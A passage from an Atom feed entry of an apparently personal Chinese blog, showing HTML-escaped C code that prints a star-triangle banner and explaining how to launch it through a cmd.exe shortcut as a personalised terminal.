class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i,j;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i&amp;lt;&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (j=&lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;;j&amp;gt;i ;j-- ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (j=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j&amp;lt;=i; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;*&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (i==&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;    write by binyanbin&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    system(&lt;span class=&quot;string&quot;&gt;&quot;c:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后用gcc编译成exe。&lt;/p&gt;
&lt;h2 id=&quot;cmd快捷方式&quot;&gt;&lt;a href=&quot;#cmd快捷方式&quot; class=&quot;headerlink&quot; title=&quot;cmd快捷方式&quot;&gt;&lt;/a&gt;cmd快捷方式&lt;/h2&gt;&lt;p&gt;新建快捷方式，输入C:\Windows\System32\cmd.exe /k “C:\yanbin\mycmd.exe”。最后为你编译exe的位置。&lt;br&gt;&lt;img src=&quot;/img/c-2.png&quot; alt=&quot;cmd快捷方式&quot;&gt;&lt;br&gt;这个cmd快捷方式就是你的个性terminal，当然你也可以打印出更漂亮的图形做你的terminal。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;很多牛人有自己的个性化的命令行，为什么我没有呢?晚上我就写了一个。效果如下:&lt;br&gt;&lt;img src=&quot;/img/c-1.png&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
